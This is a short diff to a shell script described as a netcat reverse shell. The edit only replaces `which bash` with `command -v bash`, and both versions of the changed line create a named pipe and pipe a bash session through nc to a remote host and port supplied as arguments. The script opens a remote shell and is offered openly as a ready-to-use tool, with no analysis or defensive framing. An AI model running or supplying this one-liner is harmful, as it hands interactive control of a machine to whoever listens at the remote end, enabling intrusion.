@@ -10,7 +10,7 @@
 # Netcat with a reverse shell binding on port 1337
 
 if (( $# >= 1 )); then
-  mknod backpipe p && nc $1 $2 0<backpipe | `which bash` 1>backpipe
+  mknod backpipe p && nc $1 $2 0<backpipe | `command -v bash` 1>backpipe
 else
   echo '$ netcat-reverse-shell [remote_server_listener] [port]'
 fi
